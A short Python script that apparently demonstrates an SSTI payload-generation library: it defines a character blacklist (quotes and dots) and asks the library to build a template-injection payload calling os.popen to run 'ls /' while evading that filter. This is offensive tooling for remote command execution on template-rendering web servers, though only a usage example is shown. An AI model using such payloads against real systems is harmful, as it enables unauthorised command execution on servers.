from ssti import *

def test(s):
    blacklist = ["'", '.', '"']
    for word in blacklist:
        if word in s:
            return False
    return True

mod_os = pattern.OSPopenPattern1("ls /")

mod_os.test_requirements(test)

print(mod_os.generate())
